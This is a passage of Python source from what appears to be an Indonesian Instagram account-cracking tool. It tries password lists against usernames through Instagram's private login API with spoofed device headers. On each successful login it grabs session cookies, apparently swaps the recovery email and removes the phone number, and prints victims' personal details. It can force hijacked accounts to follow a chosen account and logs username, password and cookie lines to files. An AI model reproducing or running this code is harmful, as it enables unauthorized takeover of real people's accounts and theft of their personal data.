                     param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
                     encod  = f'ig_sig_key_version=4&signed_body={param}'
                     header = {
                         'Authority': 'graph.instagram.com',
                         'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                         'X-IG-Connection-Speed': f'{random.randint(100,999)}kbps',
                         'Accept': '*/*',
                         'X-IG-Connection-Type': str(random.choice(['MOBILE(LTE)', 'WIFI'])),
                         'X-IG-App-ID': '936619743392459',
                         'Accept-Language': 'id-ID',
                         'X-IG-ABR-Connection-Speed-KBPS': '0',
                         'User-Agent': ua,
                         'Connection': 'keep-alive',
                         'X-IG-Capabilities': str(random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM='])),
                         'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2'}
                     response=XYZ.post('https://graph.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
                     if 'logged_in_user' in str(response.text):
                         self.success+=1
                         cokz = ";".join([key+"="+value.replace('"','') for key, value in XYZ.cookies.get_dict().items()])   
                         try:
                             ganti_mail = self.AddEmail(cokz)
                             curll, email_new, status_email = ganti_mail['Url'], ganti_mail['email'], ganti_mail['di-konfirmasi']
                             konfirmasi_ora = 'Di Konfirmasi' if status_email is True else ''
                             telepon = self.GetPhone(cokz)
                             status_pon, phone = telepon['Dihapus'], telepon['Number']
                             hapus_ora = f'{phone} Di Hapus' if status_pon is True else f'{phone} Tidak Di Hapus'
                             userid,nama,verified,privates,biograph,pengikut,mengikuti,postingan,pictures = self.Info(user)
                             ultah,email,nomer = self.info2(cokz)
                             Dev = Moch_Arip('\r        ',guide_style="blue")
                             Ok = Dev.add('[italic blue]KLEIN [red]» [green]OK')
                             Ok.add('[b italic white]username [green]: {}'.format(user))
                             Ok.add('[b italic white]password [green]: {}'.format(pas))
                             Ok.add('[b italic white]user id  [green]: {}'.format(userid))
                             Ok.add('[b italic white]verified [green]: {}'.format(verified))
                             Ok.add('[b italic white]privates [green]: {}'.format(privates))
                             Ok.add('[b italic white]fullname [green]: {}'.format(nama))
                             Ok.add('[b italic white]biograph [green]: {}'.format(biograph))
                             Ok.add('[b italic white]feedpost [green]: {}'.format(postingan))
                             Ok.add('[b italic white]follower [green]: {}'.format(pengikut))
                             Ok.add('[b italic white]followed [green]: {}'.format(mengikuti))
                             Ok.add('[b italic white]pictures [green]: {}'.format(pictures))
                             Ok = Dev.add('[italic blue]Info Akun [red]» [green]OK')
                             Ok.add('[b italic white]nomor akun [green]: {}'.format(nomer))
                             Ok.add('[b italic white]email akun [green]: {}'.format(email))
                             Ok.add('[b italic white]lahir akun [green]: {}'.format(ultah))
                             Ok.add('[b italic white]email baru [green]: {} {}'.format(email_new, konfirmasi_ora))
                             Ok.add('[b italic white]curl email [green]: {}'.format(curll))
                             Ok.add('[b italic white]hapus nomor [green]: {}'.format(hapus_ora)).add('[b italic white]cookies [green]: {}'.format(cokz)).add('[b italic white]user-agent [green]: {}'.format(ua))
                             facerip(Dev)
                             if 'ya' in self.mengikuti:
                                 req = XYZ.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(self.akunIGF),headers={"user-agent":UA}).json()["data"]["user"]
                                 convert_id = req['id']
                                 XYZ.headers.update({
                                     "Host": "i.instagram.com",
                                     "content-length": "0",
                                     "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                                     "x-ig-app-id": "1217981644879628",
                                     "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                                     "sec-ch-ua-mobile": "?1",
                                     "x-instagram-ajax": "1006447742",
                                     "viewport-width": "360",
                                     "content-type": "application/x-www-form-urlencoded",
                                     "accept": "*/*",
                                     "user-agent": UA,
                                     "x-asbd-id": "198387",
                                     "save-data": "on",
                                     "x-csrftoken": re.search('csrftoken=(.*?);',cokz).group(1),
                                     "sec-ch-ua-platform": '"Android"',
                                     "origin": "https://www.instagram.com",
                                     "sec-fetch-site": "same-site",
                                     "sec-fetch-mode": "cors",
                                     "sec-fetch-dest": "empty",
                                     "referer": "https://www.instagram.com/",
                                     "accept-encoding": "gzip, deflate, br",
                                     "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"})
                                 XYZ.cookies.update({'cookie':cokz})
                                 XYZ.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format(convert_id))
                             else:pass
                             with open('OK/'+okc,'a') as simpan:
                                 simpan.write(user+'|'+pas+'|'+cokz+'\n')
                             break
                         except Exception as e:
                             userid,nama,verified,privates,biograph,pengikut,mengikuti,postingan,pictures = self.Info(user)
                             ultah,email,nomer = self.info2(cokz)
                             Dev = Moch_Arip('\r        ',guide_style="blue")
                             Ok = Dev.add('[italic blue]KLEIN [red]» [green]OK')
                             Ok.add('[b italic white]username [italic green]: {}'.format(user))
                             Ok.add('[b italic white]password [italic green]: {}'.format(pas))
                             Ok.add('[b italic white]user  id  [italic green]: {}'.format(userid))
                             Ok.add('[b italic white]verified [italic green]: {}'.format(verified))
                             Ok.add('[b italic white]privates [italic green]: {}'.format(privates))
                             Ok.add('[b italic white]fullname [italic green]: {}'.format(nama))                            
                             Ok.add('[b italic white]biograph [italic green]: {}'.format(biograph))
                             Ok.add('[b italic white]feedpost [italic green]: {}'.format(postingan))
                             Ok.add('[b italic white]follower [italic green]: {}'.format(pengikut))
                             Ok.add('[b italic white]followed [italic green]: {}'.format(mengikuti))
                             Ok.add('[b italic white]pictures [italic green]: {}'.format(pictures))
                             Ok = Dev.add('[italic blue]Info Akun [red]» [green]OK')
                             Ok.add('[b italic white]nomor [italic green]: {}'.format(nomer))
                             Ok.add('[b italic white]email [italic green]: {}'.format(email))
                             Ok.add('[b italic white]lahir [italic green]: {}'.format(ultah))
                             Ok = Dev.add('[b italic white]cookies [italic green]: {}'.format(cokz))
                             Ok.add('[b italic white]user-agent [italic green]: {}'.format(ua))
                             facerip(Dev)
                             with open('OK/'+okc,'a') as simpan:
                                 simpan.write(user+'|'+pas+'|'+cokz+'\n')
                             break

                     elif 'https://i.instagram.com/challenge/' in str(response.text):
                         nama, pengikut, mengikuti, postingan = self.Info(user)
                         Dev = Moch_Arip('\r        ',guide_style="bold")
                         Cp = Dev.add('[italic blue]KLEIN [red]» [yellow]OK')
                         Cp.add('[b italic white] name [italic yellow]: {}'.format(nama))
                         Cp.add('[b italic white] username [italic yellow]: {}'.format(user))
                         Cp.add('[b italic white] password [italic yellow]: {}'.format(pas))
                         Cp.add('[b italic white] pengikut [italic yellow]: {}'.format(pengikut))
                         Cp.add('[b italic white] mengikuti [italic yellow]: {}'.format(mengikuti))
                         Cp.add('[b italic white] postingan [italic yellow]: {}'.format(postingan))
                         Cp = Dev.add('[b italic white] user-agent [italic yellow]: {}'.format(ua))
                         facerip(Cp)
                         self.chekpoint+=1
                         with open('CP/'+cpc,'a') as simpan:
                            simpan.write(user+'|'+pas+'\n')
                         break
             except requests.exceptions.ConnectionError:
                 prog.update(des,description=f'\r[b italic red]IGF.Spam [white][ OK : [green]{self.success}[white] ]—[ CP : [yellow]{self.chekpoint}[white] ] [ Die [blue]: {len(dumping)}/{self.looping} [white]]');prog.advance(des);facetime(31)
         self.looping+=1

    def Ajax(self,user,password):       
         prog.update(des,description=f'\r[b italic blue]IGF.Cracking [white][ OK : [green]{self.success}[white] ]—[ CP : [yellow]{self.chekpoint}[white] ] [ Die [blue]: {len(dumping)}/{self.looping} [white]]')
         prog.advance(des)
         ua = str(random.choice([Device().ua_RMX(),Device().ua_INF(),Device().ua_POCO()]))
         for pas in password:
             try:
                 with requests.Session() as XYZ:
                     curl = XYZ.get('https://www.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
                     payload = json.dumps({
                         'phone_id': str(uuid.uuid4()),
                         '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                         'username': user,
                         'guid': str(uuid.uuid4()),
                         'device_id': 'android-'+str(uuid.uuid4()),
                         'password': pas,
                         'login_attempt_count': '0',
                       })
                     param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
                     encod  = f'ig_sig_key_version=4&signed_body={param}'
                     header = {
                         'Authority': 'www.instagram.com',
                         'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                         'X-IG-Connection-Speed': f'{random.randint(100,999)}kbps',
                         'Accept': '*/*',
                         'X-IG-Connection-Type': str(random.choice(['MOBILE(LTE)', 'WIFI'])),
                         'X-IG-App-ID': '936619743392459',
                         'Accept-Language': 'id-ID',
                         'X-IG-ABR-Connection-Speed-KBPS': '0',
                         'User-Agent': ua,
                         'Connection': 'keep-alive',
                         'X-IG-Capabilities': str(random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM='])),
                         'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2'}
                     response=XYZ.post('https://www.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
                     if 'logged_in_user' in str(response.text):
                         self.success+=1
                         cokz = ";".join([key+"="+value.replace('"','') for key, value in XYZ.cookies.get_dict().items()])   
                         try:
                             ganti_mail = self.AddEmail(cokz)
                             curll, email_new, status_email = ganti_mail['Url'], ganti_mail['email'], ganti_mail['di-konfirmasi']
                             konfirmasi_ora = 'Di Konfirmasi' if status_email is True else ''
                             telepon = self.GetPhone(cokz)
                             status_pon, phone = telepon['Dihapus'], telepon['Number']
                             hapus_ora = f'{phone} Di Hapus' if status_pon is True else f'{phone} Tidak Di Hapus'
                             userid,nama,verified,privates,biograph,pengikut,mengikuti,postingan,pictures = self.Info(user)
                             ultah,email,nomer = self.info2(cokz)
                             Dev = Moch_Arip('\r        ',guide_style="blue")
                             Ok = Dev.add('[italic blue]KLEIN [red]» [green]OK')
                             Ok.add('[b italic white]username [green]: {}'.format(user))
                             Ok.add('[b italic white]password [green]: {}'.format(pas))
                             Ok.add('[b italic white]user id  [green]: {}'.format(userid))
                             Ok.add('[b italic white]verified [green]: {}'.format(verified))
                             Ok.add('[b italic white]privates [green]: {}'.format(privates))
                             Ok.add('[b italic white]fullname [green]: {}'.format(nama))
                             Ok.add('[b italic white]biograph [green]: {}'.format(biograph))
                             Ok.add('[b italic white]feedpost [green]: {}'.format(postingan))
                             Ok.add('[b italic white]follower [green]: {}'.format(pengikut))
                             Ok.add('[b italic white]followed [green]: {}'.format(mengikuti))
                             Ok.add('[b italic white]pictures [green]: {}'.format(pictures))
                             Ok = Dev.add('[italic blue]Info Akun [red]» [green]OK')
                             Ok.add('[b italic white]nomor akun [green]: {}'.format(nomer))
                             Ok.add('[b italic white]email akun [green]: {}'.format(email))
                             Ok.add('[b italic white]lahir akun [green]: {}'.format(ultah))
                             Ok.add('[b italic white]email baru [green]: {} {}'.format(email_new, konfirmasi_ora))
                             Ok.add('[b italic white]curl email [green]: {}'.format(curll))
                             Ok.add('[b italic white]hapus nomor [green]: {}'.format(hapus_ora)).add('[b italic white]cookies [green]: {}'.format(cokz)).add('[b italic white]user-agent [green]: {}'.format(ua))
                             facerip(Dev)
                             if 'ya' in self.mengikuti:
                                 req = XYZ.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(self.akunIGF),headers={"user-agent":UA}).json()["data"]["user"]
                                 convert_id = req['id']
                                 XYZ.headers.update({
                                     "Host": "i.instagram.com",
                                     "content-length": "0",
                                     "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                                     "x-ig-app-id": "1217981644879628",
                                     "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                                     "sec-ch-ua-mobile": "?1",
                                     "x-instagram-ajax": "1006447742",
                                     "viewport-width": "360",
                                     "content-type": "application/x-www-form-urlencoded",
                                     "accept": "*/*",
                                     "user-agent": UA,
                                     "x-asbd-id": "198387",
                                     "save-data": "on",
                                     "x-csrftoken": re.search('csrftoken=(.*?);',cokz).group(1),
                                     "sec-ch-ua-platform": '"Android"',
                                     "origin": "https://www.instagram.com",
                                     "sec-fetch-site": "same-site",
                                     "sec-fetch-mode": "cors",
                                     "sec-fetch-dest": "empty",
                                     "referer": "https://www.instagram.com/",
                                     "accept-encoding": "gzip, deflate, br",
                                     "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"})
                                 XYZ.cookies.update({'cookie':cokz})
                                 XYZ.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format(convert_id))
                             else:pass
                             with open('OK/'+okc,'a') as simpan:
                                 simpan.write(user+'|'+pas+'|'+cokz+'\n')
                             break
                         except Exception as e:
                             userid,nama,verified,privates,biograph,pengikut,mengikuti,postingan,pictures = self.Info(user)
                             ultah,email,nomer = self.info2(cokz)
                             Dev = Moch_Arip('\r        ',guide_style="blue")
                             Ok = Dev.add('[italic blue]KLEIN [red]» [green]OK')
                             Ok.add('[b italic white]username [italic green]: {}'.format(user))
                             Ok.add('[b italic white]password [italic green]: {}'.format(pas))
                             Ok.add('[b italic white]user  id  [italic green]: {}'.format(userid))
                             Ok.add('[b italic white]verified [italic green]: {}'.format(verified))
                             Ok.add('[b italic white]privates [italic green]: {}'.format(privates))
                             Ok.add('[b italic white]fullname [italic green]: {}'.format(nama))                            
                             Ok.add('[b italic white]biograph [italic green]: {}'.format(biograph))
                             Ok.add('[b italic white]feedpost [italic green]: {}'.format(postingan))
                             Ok.add('[b italic white]follower [italic green]: {}'.format(pengikut))
                             Ok.add('[b italic white]followed [italic green]: {}'.format(mengikuti))
                             Ok.add('[b italic white]pictures [italic green]: {}'.format(pictures))
                             Ok = Dev.add('[italic blue]Info Akun [red]» [green]OK')
                             Ok.add('[b italic white]nomor [italic green]: {}'.format(nomer))
                             Ok.add('[b italic white]email [italic green]: {}'.format(email))
                             Ok.add('[b italic white]lahir [italic green]: {}'.format(ultah))
                             Ok = Dev.add('[b italic white]cookies [italic green]: {}'.format(cokz))
                             Ok.add('[b italic white]user-agent [italic green]: {}'.format(ua))
                             facerip(Dev)
                             with open('OK/'+okc,'a') as simpan:
                                 simpan.write(user+'|'+pas+'|'+cokz+'\n')
                             break

                     elif 'https://i.instagram.com/challenge/' in str(response.text):
                         nama, pengikut, mengikuti, postingan = self.Info(user)
                         Dev = Moch_Arip('\r        ',guide_style="bold")
                         Cp = Dev.add('[italic blue]KLEIN [red]» [yellow]OK')
                         Cp.add('[b italic white] name [italic yellow]: {}'.format(nama))
                         Cp.add('[b italic white] username [italic yellow]: {}'.format(user))
                         Cp.add('[b italic white] password [italic yellow]: {}'.format(pas))
                         Cp.add('[b italic white] pengikut [italic yellow]: {}'.format(pengikut))
                         Cp.add('[b italic white] mengikuti [italic yellow]: {}'.format(mengikuti))
                         Cp.add('[b italic white] postingan [italic yellow]: {}'.format(postingan))
                         Cp = Dev.add('[b italic white] user-agent [italic yellow]: {}'.format(ua))
                         facerip(Cp)
                         self.chekpoint+=1
                         with open('CP/'+cpc,'a') as simpan:
                            simpan.write(user+'|'+pas+'\n')
                         break
             except requests.exceptions.ConnectionError:
                 prog.update(des,description=f'\r[b italic red]IGF.Spam [white][ OK : [green]{self.success}[white] ]—[ CP : [yellow]{self.chekpoint}[white] ] [ Die [blue]: {len(dumping)}/{self.looping} [white]]');prog.advance(des);facetime(31)
         self.looping+=1

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:faceinstans()
	except (KeyboardInterrupt, Exception) as e:
	   sys.exit(f'{str(e).title()}')
